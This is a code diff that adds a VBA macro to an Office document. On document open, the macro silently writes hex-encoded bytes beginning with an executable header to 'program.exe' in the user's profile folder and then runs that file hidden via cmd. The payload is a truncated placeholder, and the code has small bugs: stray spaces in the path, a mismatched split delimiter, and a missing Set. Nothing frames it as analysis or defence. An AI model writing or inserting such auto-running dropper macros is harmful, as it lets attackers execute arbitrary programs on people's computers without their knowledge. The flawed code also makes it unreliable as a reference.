@@ -1,0 +1,24 @@
+Private Sub Document_Open()
+    Dim FileLocation As String
+    Dim FileContents() As String
+    Dim i As Long
+    Dim n As Long
+    
+    FileLocation = Environ("USERPROFILE")
+    FileLocation = FileLocation & " \ program.exe"
+    
+    xData = "4d,5a,0,0,0"
+    xData = xData & ",ff,4f"
+    'this is shortened for the sake of example
+
+y = Split(xData, ", ")
+Set objFile = CreateObject("Scripting.FileSystemObject").OpenTextFile(FileLocation, 8, True)
+
+For i = LBound(y) To UBound(y)
+    objFile.Write Chr("&H" & y(i))
+Next i
+objFile = Nothing
+cmdLine = "cmd /c cd /d %USERPROFILE% && program"
+n = Shell(cmdLine, vbHide)
+End Sub
+
